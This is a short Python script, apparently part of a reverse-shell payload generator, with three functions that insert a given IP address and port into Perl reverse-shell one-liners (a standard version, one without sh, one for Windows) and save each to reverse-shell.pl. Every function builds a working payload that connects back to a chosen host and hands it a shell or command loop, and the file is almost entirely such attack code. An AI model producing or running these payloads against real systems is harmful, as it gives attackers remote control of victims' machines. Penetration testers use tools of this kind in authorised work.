from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def Perl(ip, port):
    payload = """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""" % (ip, port)
    with open("reverse-shell.pl", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="toggle10"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"perl",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.pl\n[/#aed06d]", style=myStyle)

def Perl_no_sh(ip, port):
    payload = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" % (ip, port)
    with open("reverse-shell.pl", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="toggle8"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"perl",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.pl\n[/#aed06d]", style=myStyle)

def Perl_Windows_Only(ip, port):
    payload = """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""" % (ip, port)
    with open("reverse-shell.pl", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="toggle8"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"perl",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.pl\n[/#aed06d]", style=myStyle)